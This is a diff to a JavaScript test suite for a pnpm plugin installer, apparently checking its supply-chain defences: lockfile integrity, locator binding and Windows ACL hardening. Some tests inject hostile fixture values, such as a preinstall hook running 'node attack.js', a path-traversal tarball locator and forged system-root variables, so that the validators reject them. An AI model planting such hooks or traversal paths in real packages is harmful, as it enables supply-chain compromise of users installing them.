+      baseline.replace("lockfileVersion: '9.0'", "lockfileVersion: '8.0'"),
+      resolved,
+      [item],
+      [directReference],
+      sourceContext
+    ),
+    /version must be exactly '9.0'/u
+  );
+
+  const patchPolicyKey = `${directPackageKey}(patch_hash=abc123)`;
+  const patchSnapshotKey = `${patchPolicyKey}(react@18.3.1)`;
+  const patched = resolved
+    .replace(
+      `version: ${JSON.stringify(`${gitTarball}(react@18.3.1)`)}`,
+      `version: ${JSON.stringify(`${gitTarball}(patch_hash=abc123)(react@18.3.1)`)}`
+    )
+    .replace(JSON.stringify(directPackageKey), JSON.stringify(patchPolicyKey))
+    .replace(JSON.stringify(directKey), JSON.stringify(patchSnapshotKey));
+  assert.throws(
+    () => resolvePnpmLifecyclePolicy(
+      baseline,
+      patched,
+      [item],
+      [directReference],
+      sourceContext
+    ),
+    /source locator mismatch/u
+  );
+
+  const alreadyRelative = resolved.replace(
+    `version: ${JSON.stringify(`${gitTarball}(react@18.3.1)`)}`,
+    `version: ${JSON.stringify(directKey)}`
+  );
+  const alreadyRelativePolicy = resolvePnpmLifecyclePolicy(
+    baseline,
+    alreadyRelative,
+    [item],
+    [directReference],
+    sourceContext
+  );
+  assert.equal(alreadyRelativePolicy.directKeys[0].snapshotKey, directKey);
+
+  const otherTarball = `https://codeload.github.com/example/other/tar.gz/${item.distribution.source.commit}`;
+  assert.throws(
+    () => resolvePnpmLifecyclePolicy(
+      baseline,
+      resolved.replaceAll(gitTarball, otherTarball),
+      [item],
+      [directReference],
+      sourceContext
+    ),
+    /source locator mismatch/u
+  );
+  assert.throws(
+    () => resolvePnpmLifecyclePolicy(
+      baseline,
+      resolved.replace('gitHosted: true', 'gitHosted: false'),
+      [item],
+      [directReference],
+      sourceContext
+    ),
+    /gitHosted mismatch/u
+  );
+  assert.throws(
+    () => resolvePnpmLifecyclePolicy(
+      baseline,
+      resolved.replace(gitIntegrity, `sha256-${Buffer.alloc(32, 1).toString('base64')}`),
+      [item],
+      [directReference],
+      sourceContext
+    ),
+    /canonical SHA-512 integrity/u
+  );
+});
+
+test('pnpm lifecycle policy binds local tarballs to profile-relative locator and staged SHA-512', () => {
+  const item = hostedFixture().item;
+  const profile = '/private/dsh/profiles/web';
+  const artifact = '/private/transaction/prepared-staging/3006/plugin.tgz';
+  const locator = `file:${relative(profile, artifact)}`;
+  const artifactIntegrity = `sha512-${Buffer.alloc(64, 9).toString('base64')}`;
+  const packageKey = `${item.package.name}@${locator}`;
+  const baseline = "lockfileVersion: '9.0'\nimporters:\n  .: {}\n";
+  const resolved = [
+    "lockfileVersion: '9.0'",
+    'importers:',
+    '  .:',
+    '    dependencies:',
+    `      ${JSON.stringify(item.package.name)}:`,
+    `        specifier: ${JSON.stringify(`file:${artifact}`)}`,
+    `        version: ${JSON.stringify(locator)}`,
+    'packages:',
+    `  ${JSON.stringify(packageKey)}:`,
+    '    resolution:',
+    `      integrity: ${JSON.stringify(artifactIntegrity)}`,
+    `      tarball: ${JSON.stringify(locator)}`,
+    `    version: ${JSON.stringify(item.package.version)}`,
+    'snapshots:',
+    `  ${JSON.stringify(packageKey)}: {}`,
+    '',
+  ].join('\n');
+  const context = { profile, artifactIntegrities: [artifactIntegrity] };
+  const policy = resolvePnpmLifecyclePolicy(
+    baseline,
+    resolved,
+    [item],
+    [artifact],
+    context
+  );
+  assert.equal(policy.directKeys[0].policyKey, packageKey);
+
+  const poisonedLocator = 'file:../../../transaction/poisoned.tgz';
+  assert.throws(
+    () => resolvePnpmLifecyclePolicy(
+      baseline,
+      resolved.replaceAll(locator, poisonedLocator),
+      [item],
+      [artifact],
+      context
+    ),
+    /source locator mismatch/u
+  );
+  const poisonedIntegrity = `sha512-${Buffer.alloc(64, 10).toString('base64')}`;
+  assert.throws(
+    () => resolvePnpmLifecyclePolicy(
+      baseline,
+      resolved.replace(artifactIntegrity, poisonedIntegrity),
+      [item],
+      [artifact],
+      context
+    ),
+    /resolution integrity mismatch/u
+  );
+  assert.throws(
+    () => resolvePnpmLifecyclePolicy(
+      baseline,
+      resolved.replace(
+        `tarball: ${JSON.stringify(locator)}`,
+        `tarball: ${JSON.stringify(poisonedLocator)}`
+      ),
+      [item],
+      [artifact],
+      context
+    ),
+    /resolution tarball mismatch/u
+  );
+});
+
+test('profile resolution surface rejects lifecycle and pnpm configuration injection', async (t) => {
+  const root = await workspace(t);
+  const profile = join(root, 'web');
+  await mkdir(profile);
+  const manifest = {
+    name: 'dsh-profile-web',
+    private: true,
+    dependencies: {},
+    dsh: {
+      profile: {
+        bundles: ['@deepseek-ai/dsh-base', '@deepseek-ai/dsh-web-app'],
+        patchReload: 'live',
+      },
+    },
+  };
+  const manifestPath = join(profile, 'package.json');
+  const workspacePath = join(profile, 'pnpm-workspace.yaml');
+  await writeFile(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`);
+  await writeFile(join(profile, 'pnpm-lock.yaml'), "lockfileVersion: '9.0'\n");
+  await writeFile(
+    workspacePath,
+    'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n'
+  );
+  await writeFile(join(profile, 'cordis.patch.yml'), '[]\n');
+  assert.equal((await validateProfileResolutionSurface(profile)).profile, await realpath(profile));
+
+  const installedManifest = structuredClone(manifest);
+  installedManifest.dependencies['dsh-installed-fixture'] = '1.0.0';
+  installedManifest.dsh.profile.bundles.push('dsh-installed-fixture');
+  await writeFile(manifestPath, `${JSON.stringify(installedManifest)}\n`);
+  await mkdir(join(profile, 'node_modules', 'dsh-installed-fixture'), { recursive: true });
+  await writeFile(
+    join(profile, 'node_modules', 'dsh-installed-fixture', 'package.json'),
+    `${JSON.stringify({ name: 'dsh-installed-fixture', version: '1.0.0' })}\n`
+  );
+  assert.equal((await validateProfileResolutionSurface(profile)).profile, await realpath(profile));
+  assert.deepEqual((await captureProfileClosure(profile)).bundles, [
+    '@deepseek-ai/dsh-base',
+    '@deepseek-ai/dsh-web-app',
+    'dsh-installed-fixture',
+  ]);
+  await writeFile(manifestPath, `${JSON.stringify(manifest)}\n`);
+
+  await writeFile(workspacePath, 'packages:\n  - .\n\nautoInstallPeers: false\n');
+  await assert.rejects(() => validateProfileResolutionSurface(profile), /nodeLinker must be hoisted/u);
+  await writeFile(workspacePath, 'packages:\n  - .\n\nnodeLinker: hoisted\n');
+  await assert.rejects(() => validateProfileResolutionSurface(profile), /autoInstallPeers must be false/u);
+  await writeFile(
+    workspacePath,
+    'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n'
+  );
+
+  await writeFile(manifestPath, `${JSON.stringify({ ...manifest, scripts: { preinstall: 'node attack.js' } })}\n`);
+  await assert.rejects(() => validateProfileResolutionSurface(profile), /manifest scripts/u);
+  await writeFile(manifestPath, `${JSON.stringify(manifest)}\n`);
+
+  await writeFile(join(profile, '.pnpmfile.cjs'), 'module.exports = {}\n');
+  await assert.rejects(() => validateProfileResolutionSurface(profile), /project configuration/u);
+  await rm(join(profile, '.pnpmfile.cjs'));
+
+  await writeFile(
+    workspacePath,
+    'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\ncatalog:\n  injected: latest\n'
+  );
+  await assert.rejects(() => validateProfileResolutionSurface(profile), /outside the fixed resolution surface/u);
+});
+
+test('install transaction resolves lockfile depPaths with scripts disabled before authorization', async () => {
+  const materialize = buildDshInvocation('/absolute/dsh-bin.js', [
+    'plugin', '--profile', 'web', 'install', '--frozen-lockfile',
+    '--ignore-scripts', '--ignore-pnpmfile',
+  ]);
+  assert.deepEqual(materialize.args.slice(1), [
+    'plugin', '--profile', 'web', 'install', '--frozen-lockfile',
+    '--ignore-scripts', '--ignore-pnpmfile',
+  ]);
+  assert.throws(
+    () => buildDshInvocation('/absolute/dsh-bin.js', [
+      'plugin', '--profile', 'web', 'install', '--frozen-lockfile',
+    ]),
+    /outside the fixed/u
+  );
+  const frozenLock = Buffer.from("lockfileVersion: '9.0'\n");
+  assert.match(verifyFrozenLockfileBytes(frozenLock, Buffer.from(frozenLock)), /^[a-f0-9]{64}$/u);
+  assert.throws(
+    () => verifyFrozenLockfileBytes(
+      frozenLock,
+      Buffer.from("lockfileVersion: '9.0'\npackages: {}\n")
+    ),
+    /changed the resolved lockfile bytes/u
+  );
+  const source = await readFile(
+    new URL('../skills/dsh-plugin-installer/scripts/install-transaction.mjs', import.meta.url),
+    'utf8'
+  );
+  const resolution = source.indexOf("'add', '--save-exact', '--ignore-scripts', '--lockfile-only'");
+  const authorization = source.indexOf('await authorizePrepare(profile, items, {');
+  const materialization = source.indexOf("'--frozen-lockfile',", authorization);
+  assert.ok(resolution > 0);
+  assert.ok(authorization > resolution);
+  assert.ok(materialization > authorization);
+  assert.match(source, /baselinePnpmLockSource[\s\S]*baselineLockSource: baselinePnpmLockSource/u);
+});
+
+test('removal resolves every reverse operation lockfile-only before one frozen materialization', async () => {
+  const source = await readFile(
+    new URL('../skills/dsh-plugin-installer/scripts/install-transaction.mjs', import.meta.url),
+    'utf8'
+  );
+  const removalExecutor = source.slice(
+    source.indexOf('export async function executeRemovalTransaction'),
+    source.indexOf('export async function executeRecoveryTransaction')
+  );
+  const reverseRemoval = removalExecutor.indexOf('for (const item of [...items].reverse())');
+  const resolvedLock = removalExecutor.indexOf('const resolvedRemovalLockBytes', reverseRemoval);
+  const resolutionBlock = removalExecutor.slice(reverseRemoval, resolvedLock);
+  const materialization = removalExecutor.indexOf("'--frozen-lockfile'", resolvedLock);
+  const lockVerification = removalExecutor.indexOf(
+    'verifyFrozenLockfileBytes(resolvedRemovalLockBytes, materializedLockBytes)',
+    materialization
+  );
+  const policyCleanup = removalExecutor.indexOf(
+    'await cleanupInstallerOwnedAllowBuilds(profile)',
+    lockVerification
+  );
+  const absenceVerification = removalExecutor.indexOf(
+    'for (const item of items) await verifyRemoved(profile, item)',
+    policyCleanup
+  );
+  assert.ok(reverseRemoval > 0);
+  assert.match(resolutionBlock, /'--lockfile-only'/u);
+  assert.match(resolutionBlock, /'--'/u);
+  assert.doesNotMatch(resolutionBlock, /--ignore-scripts|--ignore-pnpmfile/u);
+  assert.ok(resolvedLock > reverseRemoval);
+  assert.ok(materialization > resolvedLock);
+  assert.equal(removalExecutor.match(/'--frozen-lockfile'/gu)?.length, 1);
+  assert.ok(lockVerification > materialization);
+  assert.ok(policyCleanup > lockVerification);
+  assert.ok(absenceVerification > policyCleanup);
 });
 
 test('upstream preparation rejects an undisclosed standard lifecycle hook despite exact commit and manifest digests', async (t) => {
@@ -892,6 +1580,88 @@ test('upstream preparation rejects an undisclosed standard lifecycle hook despit
   await assert.rejects(
     () => prepareUpstream({ item, checkout, output: join(root, 'prepared') }),
     /lifecycle hook map/
+  );
+});
+
+test('lockless exact Git preparation admits only prebuilt packages without runtime or peer dependencies', async (t) => {
+  const root = await workspace(t);
+  const checkout = join(root, 'checkout');
+  await mkdir(checkout);
+  const item = locklessGitFixture();
+  const manifest = {
+    name: item.package.name,
+    version: item.package.version,
+    files: ['lib', item.package.bundlePatch],
+    dsh: { bundle: { patch: item.package.bundlePatch } },
+  };
+  const manifestBytes = Buffer.from(`${JSON.stringify(manifest, null, 2)}\n`);
+  await writeFile(join(checkout, 'package.json'), manifestBytes);
+  await writeFile(join(checkout, item.package.bundlePatch), '[]\n');
+  await mkdir(join(checkout, 'lib'));
+  await writeFile(join(checkout, 'lib', 'index.js'), 'export const name = "fixture"\n');
+  const git = (...args) => {
+    const result = spawnSync('git', ['-C', checkout, ...args], { encoding: 'utf8' });
+    assert.equal(result.status, 0, result.stderr);
+    return result.stdout.trim();
+  };
+  git('init', '-q');
+  git('config', 'user.name', 'Fixture');
+  git('config', 'user.email', 'fixture@example.invalid');
+  git('remote', 'add', 'origin', item.distribution.source.repository);
+  git('add', '.');
+  git('commit', '-qm', 'safe prebuilt fixture');
+  item.distribution.source.commit = git('rev-parse', 'HEAD');
+  item.distribution.source.tree = git('rev-parse', 'HEAD^{tree}');
+  item.distribution.source.installSpec =
+    `git+${item.distribution.source.repository}#${item.distribution.source.commit}`;
+  item.distribution.source.manifestSha256 = sha256(manifestBytes);
+
+  await prepareUpstream({ item, checkout, output: join(root, 'prepared') });
+  const prepared = await validatePrepared(join(root, 'prepared'), item);
+  assert.equal(prepared.record.sourceType, 'git-commit');
+  assert.equal(prepared.record.evidence.lockfileSha256, null);
+
+  const dependentManifestBytes = Buffer.from(`${JSON.stringify({
+    ...manifest,
+    dependencies: { leftPad: '1.0.0' },
+  }, null, 2)}\n`);
+  await writeFile(join(checkout, 'package.json'), dependentManifestBytes);
+  git('add', 'package.json');
+  git('commit', '-qm', 'unsafe lockless dependency');
+  item.distribution.source.commit = git('rev-parse', 'HEAD');
+  item.distribution.source.tree = git('rev-parse', 'HEAD^{tree}');
+  item.distribution.source.installSpec =
+    `git+${item.distribution.source.repository}#${item.distribution.source.commit}`;
+  item.distribution.source.manifestSha256 = sha256(dependentManifestBytes);
+  await assert.rejects(
+    () => prepareUpstream({ item, checkout, output: join(root, 'rejected') }),
+    /lockless Git source must be prebuilt/
+  );
+
+  const peerDependentManifestBytes = Buffer.from(`${JSON.stringify({
+    ...manifest,
+    peerDependencies: { react: '18.3.1' },
+  }, null, 2)}\n`);
+  await writeFile(join(checkout, 'package.json'), peerDependentManifestBytes);
+  git('add', 'package.json');
+  git('commit', '-qm', 'unsafe lockless peer dependency');
+  item.distribution.source.commit = git('rev-parse', 'HEAD');
+  item.distribution.source.tree = git('rev-parse', 'HEAD^{tree}');
+  item.distribution.source.installSpec =
+    `git+${item.distribution.source.repository}#${item.distribution.source.commit}`;
+  item.distribution.source.manifestSha256 = sha256(peerDependentManifestBytes);
+  await assert.rejects(
+    () => prepareUpstream({ item, checkout, output: join(root, 'rejected-peer') }),
+    /lockless Git source must be prebuilt/
+  );
+
+  assert.equal(manifestHasRuntimeDependencyGraph({ peerDependencies: {} }), false);
+  assert.equal(manifestHasRuntimeDependencyGraph({ peerDependenciesMeta: {} }), false);
+  assert.equal(
+    manifestHasRuntimeDependencyGraph({
+      peerDependenciesMeta: { react: { optional: true } },
+    }),
+    true
   );
 });
 
@@ -1003,6 +1773,15 @@ test('transaction planning resolves exact authority members and production execu
   assert.throws(
     () => buildPlan(promoted.authority, ['#3999'], planOptions),
     /lacks one exact verified authority record/
+  );
+  const liveLifecycle = gitFixture();
+  const livePromoted = promotedContext(loaded, fullItemSet([liveLifecycle]));
+  assert.throws(
+    () => buildPlan(livePromoted.authority, ['#3052'], {
+      top10ReleaseSet: livePromoted.top10ReleaseSet,
+      validationOptions: livePromoted.validationOptions,
+    }),
+    /requires a live lifecycle build/u
   );
   const top10 = buildPlan(promoted.authority, [], { ...planOptions, top10: true });
   assert.deepEqual(
@@ -1144,6 +1923,15 @@ test('retained recovery uses nonce-scoped opaque bindings instead of secret-deri
   const snapshot = join(transaction, 'snapshot');
   await mkdir(profile, { recursive: true });
   await mkdir(transaction, { mode: 0o700 });
+  if (process.platform === 'win32') {
+    const transactionIdentity = await captureWindowsPrivatePathIdentity(
+      transaction,
+      'directory'
+    );
+    await secureWindowsPrivatePath(transaction, 'directory', 'configure', {
+      expectedIdentity: transactionIdentity,
+    });
+  }
   await writeFile(join(profile, 'package.json'), `${JSON.stringify({
     name: 'dsh-profile-web',
     private: true,
@@ -1268,6 +2056,23 @@ test('retained recovery uses nonce-scoped opaque bindings instead of secret-deri
   await writeFile(join(transaction, 'in-progress.json'), 'not-json-and-must-never-be-read\n', {
     mode: 0o666,
   });
+  if (process.platform === 'win32') {
+    await secureWindowsPrivatePaths(await Promise.all([
+      'plan.json',
+      'rollback-baseline.json',
+      'state.json',
+      'recovery-auth.json',
+      'in-progress.json',
+    ].map(async (name) => {
+      const path = join(transaction, name);
+      return {
+        path,
+        kind: 'file',
+        action: 'configure',
+        expectedIdentity: await captureWindowsPrivatePathIdentity(path, 'file'),
+      };
+    })));
+  }
 
   const source = await loadRecoverySource(transaction, recoveryKey);
   assert.equal(source.kind, 'terminal');
@@ -1322,6 +2127,12 @@ test('retained recovery uses nonce-scoped opaque bindings instead of secret-deri
     `${JSON.stringify({ ...state, coldRestartVerified: false }, null, 2)}\n`,
     { mode: 0o600 }
   );
+  if (process.platform === 'win32') {
+    const stateIdentity = await captureWindowsPrivatePathIdentity(statePath, 'file');
+    await secureWindowsPrivatePath(statePath, 'file', 'configure', {
+      expectedIdentity: stateIdentity,
+    });
+  }
   await assert.rejects(
     () => loadRecoverySource(transaction, recoveryKey),
     /does not match its plan|not authenticated/
@@ -1393,8 +2204,20 @@ test('recovery trust root creates and reloads one private 32-byte key', async (t
     assert.equal(rootStat.mode & 0o077, 0);
     assert.equal(keyStat.mode & 0o077, 0);
   } else {
-    const rootProof = await secureWindowsPrivatePath(root, 'directory', 'verify');
-    const keyProof = await secureWindowsPrivatePath(key, 'file', 'verify');
+    const [rootProof, keyProof] = await secureWindowsPrivatePaths([
+      {
+        path: root,
+        kind: 'directory',
+        action: 'verify',
+        expectedIdentity: await captureWindowsPrivatePathIdentity(root, 'directory'),
+      },
+      {
+        path: key,
+        kind: 'file',
+        action: 'verify',
+        expectedIdentity: await captureWindowsPrivatePathIdentity(key, 'file'),
+      },
+    ]);
     assert.equal(rootProof.ownerSid, rootProof.currentSid);
     assert.equal(rootProof.ruleCount, 1);
     assert.equal(rootProof.ruleSid, rootProof.currentSid);
@@ -1468,6 +2291,15 @@ test('authenticated interrupted journal requires exact stale holder, separate co
   const blockedTransaction = join(root, 'blocked-transaction');
   await mkdir(profile, { recursive: true });
   await mkdir(sourceTransaction, { mode: 0o700 });
+  if (process.platform === 'win32') {
+    const sourceTransactionIdentity = await captureWindowsPrivatePathIdentity(
+      sourceTransaction,
+      'directory'
+    );
+    await secureWindowsPrivatePath(sourceTransaction, 'directory', 'configure', {
+      expectedIdentity: sourceTransactionIdentity,
+    });
+  }
   await mkdir(recoveryOne, { mode: 0o700 });
   await mkdir(recoveryTwo, { mode: 0o700 });
   await mkdir(blockedTransaction, { mode: 0o700 });
@@ -1554,6 +2386,21 @@ test('authenticated interrupted journal requires exact stale holder, separate co
   const journal = { schemaVersion: 1, state, authentication };
   const journalBytes = Buffer.from(`${JSON.stringify(journal, null, 2)}\n`);
   await writeFile(journalPath, journalBytes, { mode: 0o600 });
+  if (process.platform === 'win32') {
+    await secureWindowsPrivatePaths(await Promise.all([
+      'plan.json',
+      'rollback-baseline.json',
+      'in-progress.json',
+    ].map(async (name) => {
+      const path = join(sourceTransaction, name);
+      return {
+        path,
+        kind: 'file',
+        action: 'configure',
+        expectedIdentity: await captureWindowsPrivatePathIdentity(path, 'file'),
+      };
+    })));
+  }
 
   const source = await loadRecoverySource(sourceTransaction, recoveryKey);
   assert.equal(source.kind, 'interrupted');
@@ -1591,6 +2438,9 @@ test('authenticated interrupted journal requires exact stale holder, separate co
     authorityBytes,
     authoritySha256: sha256(authorityBytes),
     harnessAuthorityBytes: loaded.harnessAuthorityBytes,
+    migrationMapBytes: loaded.migrationMapBytes,
+    migrationMapSchemaBytes: loaded.migrationMapSchemaBytes,
+    candidateIntakeBytes: loaded.candidateIntakeBytes,
     top10ReleaseSetSha256: sha256(promoted.top10ReleaseSetBytes),
   };
   await assert.rejects(
@@ -1714,25 +2564,69 @@ test('authenticated interrupted journal requires exact stale holder, separate co
   await rm(guardRoot, { recursive: true });
 });
 
-test('Windows recovery ACL runner uses a bounded cold-start budget and validates SID-only proof', async () => {
+function fakeWindowsStat(kind, volumeSerial, fileIndex) {
+  return {
+    dev: BigInt(volumeSerial),
+    ino: BigInt(fileIndex),
+    nlink: 1n,
+    isDirectory: () => kind === 'directory',
+    isFile: () => kind === 'file',
+    isSymbolicLink: () => false,
+  };
+}
+
+const WINDOWS_SYSTEM_ROOT_FOR_TESTING = String.raw`C:\Windows`;
+const WINDOWS_POWERSHELL_TEMP_FOR_TESTING = String.raw`C:\private\powershell-temp`;
+
+function windowsSystemRootTestOptions() {
+  return process.platform === 'win32'
+    ? {}
+    : {
+        powerShellTempForTesting: WINDOWS_POWERSHELL_TEMP_FOR_TESTING,
+        systemRootForTesting: WINDOWS_SYSTEM_ROOT_FOR_TESTING,
+      };
+}
+
+function windowsAclProof(kind, volumeSerial, fileIndex, overrides = {}) {
+  return {
+    schemaVersion: 3,
+    kind,
+    volumeSerial: String(volumeSerial),
+    fileIndex: String(fileIndex),
+    fileSystem: 'NTFS',
+    currentSid: 'S-1-5-21-1000',
+    ownerSid: 'S-1-5-21-1000',
+    protected: true,
+    ruleCount: 1,
+    ruleSid: 'S-1-5-21-1000',
+    inherited: false,
+    allow: true,
+    fullControl: true,
+    inheritanceFlags: kind === 'directory' ? 3 : 0,
+    propagationFlags: 0,
+    shareMode: 1,
+    ...overrides,
+  };
+}
+
+test('Windows recovery ACL runner binds a native handle identity and validates SID-only proof', async () => {
   const calls = [];
+  const expectedIdentity = { volumeSerial: '41', fileIndex: '9001' };
+  const systemRootOptions = windowsSystemRootTestOptions();
+  const trustedSystemRoot = trustedWindowsSystemRoot({
+    platform: 'win32',
+    ...systemRootOptions,
+  });
+  const lstatPath = async () => fakeWindowsStat('directory', 41, 9001);
   const execute = async (...args) => {
     calls.push(args);
+    const options = args[2];
     return {
-      stdout: `${JSON.stringify({
-        schemaVersion: 1,
-        kind: 'directory',
-        currentSid: 'S-1-5-21-1000',
-        ownerSid: 'S-1-5-21-1000',
-        protected: true,
-        ruleCount: 1,
-        ruleSid: 'S-1-5-21-1000',
-        inherited: false,
-        allow: true,
-        fullControl: true,
-        inheritanceFlags: 3,
-        propagationFlags: 0,
-      })}\n`,
+      stdout: `${JSON.stringify(windowsAclProof(
+        'directory',
+        options.env.DSH_PLUGIN_PRIVATE_VOLUME_SERIAL,
+        options.env.DSH_PLUGIN_PRIVATE_FILE_INDEX
+      ))}\n`,
       stderr: '',
     };
   };
@@ -1742,18 +2636,26 @@ test('Windows recovery ACL runner uses a bounded cold-start budget and validates
     'configure',
     {
       environment: {
-        SystemRoot: 'C:\\Windows',
+        SystemRoot: 'Z:\\forged-system-root',
+        WINDIR: 'Y:\\different-forged-system-root',
         TEMP: 'C:\\Temp',
         SECRET_TOKEN: 'must-not-cross-boundary',
       },
       execute,
+      expectedIdentity,
+      lstatPath,
       platform: 'win32',
+      ...systemRootOptions,
     }
   );
   assert.equal(proof.ruleSid, proof.currentSid);
   assert.equal(WINDOWS_PRIVATE_ACL_TIMEOUT_MS, 60_000);
   assert.equal(calls.length, 1);
-  const [, args, options] = calls[0];
+  const [executable, args, options] = calls[0];
+  assert.equal(
+    executable,
+    `${trustedSystemRoot}\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
+  );
   assert.deepEqual(args.slice(0, 6), [
     '-NoLogo', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command',
   ]);
@@ -1762,23 +2664,512 @@ test('Windows recovery ACL runner uses a bounded cold-start budget and validates
   assert.equal(options.env.DSH_PLUGIN_PRIVATE_PATH, 'C:\\private\\trust-root');
   assert.equal(options.env.DSH_PLUGIN_PRIVATE_KIND, 'directory');
   assert.equal(options.env.DSH_PLUGIN_PRIVATE_ACTION, 'configure');
+  assert.equal(options.env.DSH_PLUGIN_PRIVATE_VOLUME_SERIAL, '41');
+  assert.equal(options.env.DSH_PLUGIN_PRIVATE_FILE_INDEX, '9001');
+  assert.equal(options.env.SystemRoot, trustedSystemRoot);
+  assert.equal(options.env.WINDIR, trustedSystemRoot);
+  assert.equal(options.env.TEMP, WINDOWS_POWERSHELL_TEMP_FOR_TESTING);
+  assert.equal(options.env.TMP, WINDOWS_POWERSHELL_TEMP_FOR_TESTING);
   assert.equal(options.env.SECRET_TOKEN, undefined);
-  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /SetAccessRuleProtection\(\$true, \$false\)/);
-  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /Rules\.Count -ne 1/i);
-  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /FileSystemRights -ne \$fullControl/);
+  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /CreateFileW/u);
+  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /GetFileInformationByHandle/u);
+  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /GetVolumeInformationByHandleW/u);
+  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /"NTFS"/u);
+  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /SetSecurityInfo/u);
+  assert.match(
+    WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT,
+    /uint shareMode = FileShareRead \| \(openWriter \? FileShareWrite : 0\)/u
+  );
+  assert.doesNotMatch(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /FileShareDelete/u);
+  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /SetAccessRuleProtection\(true, false\)/u);
+  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /rules\.Count == 1/u);
+  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /FileSystemRights\.FullControl/u);
+  assert.equal(
+    WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT.includes(
+      String.raw`return "\\\\?\\" + normalized;`
+    ),
+    true
+  );
   assert.doesNotMatch(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /S-1-5-18/);
+  assert.doesNotMatch(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /Add-Type/u);
+  assert.doesNotMatch(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /\.SetAccessControl\(/u);
+  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /DriveFormat/u);
+  assert.match(
+    WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT,
+    /\[IO\.Directory\]::CreateDirectory\(\$path, \$security\)/u
+  );
+  assert.match(
+    WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT,
+    /DeleteSubdirectoriesAndFiles/u
+  );
+  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /CreateDirectories/u);
+  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /ChangePermissions/u);
+  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /TakeOwnership/u);
+  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /S-1-5-32-544/u);
+  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /checkedAncestorCount/u);
+  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /SetAccessRuleProtection\(\$true, \$false\)/u);
+  assert.match(WINDOWS_POWERSHELL_TEMP_BOOTSTRAP_SCRIPT, /GetCurrent\(\)\.User/u);
 
   await assert.rejects(
     () => secureWindowsPrivatePath('C:\\private\\trust-root', 'directory', 'verify', {
       environment: { SystemRoot: 'C:\\Windows' },
       execute: async () => ({
-        stdout: '{"schemaVersion":1,"kind":"directory","currentSid":"S-1-5-21-1000","ownerSid":"S-1-5-18","protected":true,"ruleCount":1,"ruleSid":"S-1-5-21-1000","inherited":false,"allow":true,"fullControl":true,"inheritanceFlags":3,"propagationFlags":0}\n',
+        stdout: `${JSON.stringify(windowsAclProof(
+          'directory',
+          41,
+          9001,
+          { ownerSid: 'S-1-5-18' }
+        ))}\n`,
         stderr: '',
       }),
+      expectedIdentity,
+      lstatPath,
       platform: 'win32',
+      ...systemRootOptions,
     }),
     /malformed or weaker/
   );
+
+  await assert.rejects(
+    () => secureWindowsPrivatePath('C:\\private\\trust-root', 'directory', 'verify', {
+      environment: {},
+      execute: async () => ({
+        stdout: `${JSON.stringify(windowsAclProof(
+          'directory',
+          41,
+          9001,
+          { shareMode: 3 }
+        ))}\n`,
+        stderr: '',
+      }),
+      expectedIdentity,
+      lstatPath,
+      platform: 'win32',
+      ...systemRootOptions,
+    }),
+    /malformed or weaker/
+  );
+
+  let inspection = 0;
+  await assert.rejects(
+    () => secureWindowsPrivatePath('C:\\private\\trust-root', 'directory', 'verify', {
+      environment: { SystemRoot: 'C:\\Windows' },
+      execute: async () => ({
+        stdout: `${JSON.stringify(windowsAclProof('directory', 41, 9001))}\n`,
+        stderr: '',
+      }),
+      expectedIdentity,
+      lstatPath: async () => {
+        inspection += 1;
+        return inspection === 1
+          ? fakeWindowsStat('directory', 41, 9001)
+          : fakeWindowsStat('directory', 41, 9002);
+      },
+      platform: 'win32',
+      ...systemRootOptions,
+    }),
+    /target changed during verification/
+  );
+
+  await assert.rejects(
+    () => secureWindowsPrivatePath('C:\\private\\trust-root', 'directory', 'verify', {
+      environment: {},
+      execute: async () => ({
+        stdout: `${JSON.stringify(windowsAclProof(
+          'directory',
+          41,
+          9001,
+          { fileSystem: 'ReFS' }
+        ))}\n`,
+        stderr: '',
+      }),
+      expectedIdentity,
+      lstatPath,
+      platform: 'win32',
+      ...systemRootOptions,
+    }),
+    /malformed or weaker/
+  );
+
+  const longTarget = `C:\\private\\${'a'.repeat(300)}`;
+  await secureWindowsPrivatePath(longTarget, 'directory', 'verify', {
+    environment: {},
+    execute,
+    expectedIdentity,
+    lstatPath,
+    platform: 'win32',
+    ...systemRootOptions,
+  });
+  assert.equal(calls.at(-1)[2].env.DSH_PLUGIN_PRIVATE_PATH, longTarget);
+  await assert.rejects(
+    () => secureWindowsPrivatePath('\\\\server\\share\\private', 'directory', 'verify', {
+      environment: {},
+      execute,
+      expectedIdentity,
+      lstatPath,
